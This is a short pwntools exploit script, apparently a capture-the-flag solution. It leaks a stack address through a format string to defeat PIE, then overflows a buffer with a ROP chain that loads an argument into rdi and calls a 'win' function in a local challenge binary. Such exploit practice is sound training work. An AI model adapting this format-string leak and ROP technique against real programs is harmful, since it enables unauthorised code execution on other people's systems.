from pwn import *
context.log_level = "ERROR"
elf = context.binary = ELF("./bin")
rop = ROP("./bin")

# for i in range(0, 50):
#     io = process("./bin")
#     io.recvline()
#     payload = '%{}$p'.format(i)
#     io.sendline(payload.encode())
#     print(i, io.recvline())

io = process()
io.recvline()
payload  = b'%49$p'
io.sendline(payload)
data = int(io.recvline().decode(), 16)

bin_base = data - elf.symbols._start
print("Binary Base Add: ", hex(bin_base))

arg = 0xdeadbeefcafebabe
pop_rdi_ret = bin_base + rop.find_gadget(["pop rdi", "ret"]).address
win = bin_base + elf.symbols.win

junk = b'A'*0x68

payload = junk
payload += p64(pop_rdi_ret) + p64(arg)
payload += p64(win)

io.recvline()
io.sendline(payload)

io.interactive()